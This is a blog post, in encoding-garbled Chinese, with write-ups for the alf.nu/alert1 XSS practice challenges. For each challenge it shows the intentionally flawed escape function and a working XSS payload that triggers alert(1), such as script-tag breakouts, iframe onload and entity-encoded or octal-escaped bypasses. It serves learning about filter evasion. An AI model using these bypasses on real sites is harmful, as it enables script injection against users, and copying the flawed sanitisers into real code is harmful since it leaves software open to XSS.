<!DOCTYPE html>
<html lang>
  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">

<meta name="theme-color" content="#f8f5ec">
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="XSSç»ƒä¹ :alf.nu/alert1 Write-ups"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="https://cxliker.github.io/rss" title="è›‹æŒçš„ç¬”è®°æœ¬"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
<link rel="canonical" href="https://cxliker.github.io/2018/01/29/XSSç»ƒä¹ -alf-nu-alert1-Write-ups/">

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.1">

<script id="baidu_analytics">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?1fb3396bc01d62b8be6fcb651441065c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
  <script id="leancloud">
    AV.init({
      appId: "92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz",
      appKey: "gAPpmDXQmTGE9s9a3eU4nJ0h"
    });
  </script><script>
  window.config = {"leancloud":{"app_id":"92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz","app_key":"gAPpmDXQmTGE9s9a3eU4nJ0h"},"toc":true,"fancybox":true,"pjax":true,"latex":false};
</script>

    <title>XSSç»ƒä¹ :alf.nu/alert1 Write-ups - è›‹æŒçš„ç¬”è®°æœ¬</title>
  </head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">è›‹æŒçš„ç¬”è®°æœ¬</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/archives/">
        <li class="mobile-menu-item">å½’æ¡£
          </li>
      </a><a href="/about">
        <li class="mobile-menu-item">å…³äº
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">è›‹æŒçš„ç¬”è®°æœ¬</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            å½’æ¡£
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about">
            å…³äº
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">XSSç»ƒä¹ :alf.nu/alert1 Write-ups
        </h1>

      <div class="post-meta">
        <span class="author">
          danta
        </span>
        <span class="post-time">
          2018-01-29 17:26
        </span><span class="post-visits" data-url="/2018/01/29/XSSç»ƒä¹ -alf-nu-alert1-Write-ups/" data-title="XSSç»ƒä¹ :alf.nu/alert1 Write-ups">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">æ–‡ç« ç›®å½•</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#å‰è¨€"><span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Warmup"><span class="toc-text">Warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Adobe"><span class="toc-text">Adobe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSON"><span class="toc-text">JSON</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript"><span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Markdown"><span class="toc-text">Markdown</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DOM"><span class="toc-text">DOM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Callback"><span class="toc-text">Callback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Skandia"><span class="toc-text">Skandia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Template"><span class="toc-text">Template</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSON-1"><span class="toc-text">JSON ][</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Callback-1"><span class="toc-text">Callback ][</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Skandia-1"><span class="toc-text">Skandia ][</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#iframe"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TI-S-M"><span class="toc-text">TI(S)M</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JSON-â…¢"><span class="toc-text">JSON â…¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Skandia-â…¢"><span class="toc-text">Skandia â…¢</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RFC4627"><span class="toc-text">RFC4627</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Brunn"><span class="toc-text">Brunn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#No"><span class="toc-text">No</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kâ€™Zâ€™K"><span class="toc-text">Kâ€™Zâ€™K</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kâ€™Zâ€™K-1"><span class="toc-text">Kâ€™Zâ€™K</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kâ€™Zâ€™K-2"><span class="toc-text">Kâ€™Zâ€™K</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fruit-1"><span class="toc-text">Fruit 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fruit-2"><span class="toc-text">Fruit 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fruit-3"><span class="toc-text">Fruit 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Quine"><span class="toc-text">Quine</span></a></li></ol>
    </div>
  </div><div class="post-content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™äº›å¤©åœ¨<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alf.nu/alert1</a>ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚</p>
<a id="more"></a>

<h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œåªè¦é—­åˆæ‰console.logå³å¯ã€‚<br>solution(12 chars): <code>&quot;);alert(1,&quot;</code><br><br><br><br><br></p>
<h1 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜escapeå°†è¾“å…¥çš„å¼•å·<code>&quot;</code>è½¬æ¢ä¸ºäº†<code>\\&quot;</code>ï¼Œä½¿å¾—å¼•å·å˜æˆäº†å­—é¢é‡ï¼Œä¸Šä¸€é¢˜çš„æ–¹æ³•æ— æ•ˆäº†ã€‚ä¸è¿‡å¦‚æœè¾“å…¥ä¸º<code>\&quot;</code>ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æ¢ä¸º<code>\\\&quot;</code>ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ¬æ¥æ˜¯è½¬ä¹‰å¼•å·çš„ï¼Œä½†å˜æˆäº†è½¬ä¹‰åæ–œæ†äº†ï¼Œä»è€Œå¼•å·å¯ä»¥é€ƒè„±è½¬ä¹‰äº†ã€‚<br>solution(14 chars): <code>\&quot;);alert(1)//</code><br><br><br><br><br></p>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç”¨äº†<code>JSON.stringify()</code>(<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify" target="_blank" rel="noopener">ç›¸å…³ä»‹ç»</a>)æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿‡æ»¤äº†<code>\</code>,<code>&quot;</code>ç­‰å­—ç¬¦ï¼Œåˆ†åˆ«è½¬åŒ–ä¸º<code>\\</code>,<code>\&quot;</code>ç­‰ï¼Œä½†æ²¡æœ‰è¿‡æ»¤<code>&lt;</code>,<code>&gt;</code>,<code>/</code>å­—ç¬¦ï¼Œè¿™å°±å¤Ÿç”¨äº†ã€‚æ—¢ç„¶é—­åˆä¸äº†<code>log</code>å‡½æ•°ï¼Œé‚£å°±é—­åˆ<code>script</code>æ ‡ç­¾å§<br>solution(27 chars): <code>&lt;/script&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p>
<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·å› ä¸º<code>JSON.stringify()</code>çš„åŸå› æ²¡åŠæ³•ç”¨ç›´æ¥ç”¨<code>&quot;</code>ï¼Œä½†æ˜¯ç”±äºè¿™æ¬¡æ³¨å…¥çš„åœ°æ–¹æ˜¯urlï¼Œæ‰€ä»¥å¯ä»¥ç”¨URLç¼–ç çš„åŠæ³•è®²<code>&quot;</code>è½¬æ¢ä¸º<code>%22</code>ã€‚<br>solution(15 chars): <code>%22);alert(1)//</code><br><br><br><br><br></p>
<h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">  <span class="comment">// URLs</span></span><br><span class="line">  text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">  <span class="comment">// [[img123|Description]]</span></span><br><span class="line">  text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåˆ†æè¿™é¢˜çš„å¤„ç†æ–¹æ³•</p>
<ol>
<li>é¦–å…ˆï¼Œå¯¹äºä»»ä½•è¾“å…¥ï¼Œå…ˆè¿‡æ»¤æ‰<code>&lt;</code>å’Œ<code>&quot;</code>å˜ä¸ºå®ä½“ç¼–ç <code>&amp;lt</code>å’Œ<code>&amp;quot</code>ã€‚</li>
<li>å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰åŒ…å«<code>http://</code>å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚<code>http://xiao.world</code>åˆ™å˜ä¸º<code>&lt;a href=&quot;http://xiao.world&quot;&gt;http://xiao.world&lt;/a&gt;</code></li>
<li>å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«<code>[[img_src|img_alt]]</code>æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œåˆ™å˜ä¸º<code>&lt;img alt=&quot;img_alt&quot; src=&quot;this_src.git&quot;&gt;</code></li>
<li>è¿”å›å­—ç¬¦ä¸²</li>
</ol>
<p>å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºå°–æ‹¬å·å’Œå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ä»è¿™é‡Œå…¥æ‰‹ä¼šæ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹çš„è§„åˆ™æ¥åšçªç ´å£ã€‚ä¸ºç”šä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæ—¢ç„¶è‡ªå·±æ²¡åŠæ³•é—­åˆå±æ€§çš„å¼•å·æˆ–è€…æ ‡ç­¾ï¼Œä½†æ˜¯è§„åˆ™äºŒè½¬æ¢ä¹‹åä¼šå¸¦æœ‰å¼•å·ï¼Œåˆ©ç”¨è¿™ä¸ªå¼•å·ï¼Œå°±å¯ä»¥é—­åˆæ‰è§„åˆ™ä¸‰è½¬æ¢ä¹‹åçš„imgæ ‡ç­¾çš„altå±æ€§äº†ã€‚<br>è¾“å…¥ï¼š<code>[[a|http://onerror=&#39;alert(1)]]</code><br>ç»è¿‡è§„åˆ™ä¸€è½¬æ¢å:<code>[[a|&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;]]&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>å†ç»è¿‡è§„åˆ™äºŒè½¬æ¢ï¼š <code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>æ„Ÿè°¢HTMLè¯­è¨€æ¾æ•£çš„ç‰¹æ€§ï¼Œä»¥ä¸Šå³ç›¸å½“äº: <code>&lt;img alt=&quot;&lt;a href=&quot; http:=&quot;&quot; onerror=&quot;alert(1)&quot; &quot;=&quot;&quot; src=&quot;a.gif&quot;&gt;</code><br>å†ç²¾ç®€ä¸€ç‚¹ï¼Œåªçœ‹å…³é”®éƒ¨åˆ†: <code>&lt;img alt=&quot;&lt;a href=&quot; onerror=&quot;alert(1)&quot; src=&quot;a.git&quot;&gt;</code><br>è‡³æ­¤ï¼Œå¤§åŠŸå‘ŠæˆğŸ˜„ã€‚<br>solution(31 chars): <code>[[a|http://onerror=&#39;alert(1)&#39;]]</code><br><br><br><br><br></p>
<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Slightly too lazy to make two input fields.</span></span><br><span class="line">  <span class="comment">// Pass in something like "TextNode#foo"</span></span><br><span class="line">  <span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Only slightly contrived at this point.</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));</span><br><span class="line">  <span class="keyword">return</span> a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®åœ¨äºç†è§£ç¬¬å…«è¡Œçš„ä»£ç ã€‚<br>å¦‚æœè¾“å…¥ä¸º<code>Element#alert</code><br>ç¬¬å…«è¡Œä¸ºï¼š<code>document[&quot;createElement&quot;].apply(document, &quot;alert&quot;)</code><br>ç›¸å½“äº<code>document.createElement(&quot;alert&quot;)</code><br>è¿™æ ·åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<code>&lt;alert&gt;</code>æ ‡ç­¾ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚æ‰€ä»¥æŸ¥ä¸€ä¸‹documentæœ‰å“ªäº›createå¼€å¤´çš„æ–¹æ³•ï¼Œä¸€ä¸‹åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„ï¼š</p>
<blockquote>
<p>createElement<br>createTextNode<br>createComment<br>createAttribute<br>createEvent</p>
</blockquote>
<p>è¿™é‡Œçœ‹åˆ°æœ‰<code>createComment</code>å°±ä»¤äººç‰¹åˆ«å¼€å¿ƒã€‚æ‰€ä»¥ç­”æ¡ˆè§ä¸‹<br>solution(32 chars): <code>Comment#&gt;&lt;iframe onload=alert(1)</code><br><br><br><br><br></p>
<h1 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éšä¾¿è¾“å…¥ç‚¹çœ‹çœ‹æ•ˆæœå§ï¼š<code>input1#input2</code><br>è¾“å‡º: <code>&lt;script&gt;input1({&quot;userdata&quot;:&quot;input2&quot;})&lt;/script&gt;</code><br>å› ä¸ºinput1æœ‰è¾“å…¥è¦æ±‚ï¼Œä½†æ˜¯input2å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ³¨å…¥å¯ä»¥æ”¾åœ¨input2ï¼Œä½†æ˜¯åœ¨input2ä¹‹å‰æœ‰ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œæœ€ç›´æ¥ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨å¼•å·é—­åˆæ‰ä»–ä»¬å°±å¥½äº†ã€‚æ‰€å¹¸input1å¹¶æ²¡æœ‰æŠŠå•å¼•å·è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯<br>solution(15 chars): <code>&#39;#&#39;;alert(1);//</code><br><br><br><br><br></p>
<h1 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®çœŸçŸ­ï¼Œä½†å¿ƒæ€æ²¡å°‘èŠ±å‘€ã€‚<br>jsçš„æ–¹æ³•åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå¦‚æœæŠŠ<code>alert</code>å˜ä¸ºäº†<code>ALERT</code>ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚ä½†æ˜¯HTMLæ ‡ç­¾åå’Œå±æ€§åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‰<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œç„¶åè‡ªå·±æ³¨å…¥æ ‡ç­¾ï¼Œåˆ©ç”¨<code>onload</code>å±æ€§å‡ºå‘<code>alert</code>ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯<code>alert</code>å¤§å°å†™æ€ä¹ˆåŠå‘¢ï¼Ÿä¾æˆ‘ä¸ªäººæµ‹è¯•å’Œç†è§£(æš‚æ—¶æœªæ‰¾åˆ°æ ¹æ®)ï¼Œåœ¨å±æ€§å€¼å¤„ä½¿ç”¨å®ä½“ç¼–ç çš„è¯ï¼Œæ˜¯å¯ä»¥è‡ªåŠ¨è§£ç çš„,å…¶ä»–åœ°æ–¹åˆ™ä¸è¡Œã€‚æ‰€ä»¥ï¼Œé—®é¢˜è§£å†³äº†ã€‚<br>solution(53 chars): <code>&lt;/script&gt;&lt;iframe onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)&gt;</code><br>ä½†æˆ‘è¿™ä¸ªè§£ç”¨äº†53ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸æ˜¯æœ€çŸ­çš„ï¼Œä½†æ˜¯æœ‰äººä¹Ÿæœ‰äººåšåˆ°äº†30å¤šå’Œ40å¤šçš„ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæƒ³ä¸åˆ°ä»€ä¹ˆåŠæ³•ã€‚æœ‰çŸ¥é“çš„è¯·å‘Šè¯‰æˆ‘ä¸€å£°ï¼Œè°¢è°¢ğŸ˜„<br><br><br><br><br></p>
<h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/./g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> &#123; <span class="string">'&lt;'</span>: <span class="string">'&amp;lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&amp;gt;'</span>, <span class="string">'&amp;'</span>: <span class="string">'&amp;amp;'</span>, <span class="string">'"'</span>: <span class="string">'&amp;quot;'</span>, <span class="string">"'"</span>: <span class="string">'&amp;#39;'</span> &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span>(<span class="params">template, args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_, n</span>) </span>&#123; </span><br><span class="line">           <span class="keyword">return</span> htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> expandTemplate(</span><br><span class="line">    <span class="string">"                                                \n\</span></span><br><span class="line"><span class="string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span></span><br><span class="line"><span class="string">      &lt;script&gt;                                       \n\</span></span><br><span class="line"><span class="string">         var v = document.getElementById('name');    \n\</span></span><br><span class="line"><span class="string">         v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;';       \n\</span></span><br><span class="line"><span class="string">      &lt;\/script&gt;                                     \n\</span></span><br><span class="line"><span class="string">    "</span>,</span><br><span class="line">    &#123; <span class="attr">name</span> : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•æ¥è¯´ï¼Œå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿‡æ»¤æ‰å°–æ‹¬å·ï¼Œå¼•å·ç­‰ï¼Œç„¶åå°†å¤„ç†å®Œçš„å­—ç¬¦ä¸²æ›¿æ¢æ‰æ¨¡æ¿å­—ç¬¦ä¸²ä¸­<code>{name}</code>ã€‚ä½†æ˜¯ç™¾å¯†ä¸€ç–ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ç”¨8è¿›åˆ¶æˆ–è€…16è¿›åˆ¶æ¥è¡¨ç¤ºå­—ç¬¦ã€‚æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ã€‚<code>&lt;</code>å¯¹åº”çš„å…«è¿›åˆ¶æ˜¯<code>\74</code>ã€‚<br>solution(27): <code>\74iframe onload=alert(1)//</code><br><br><br><br><br></p>
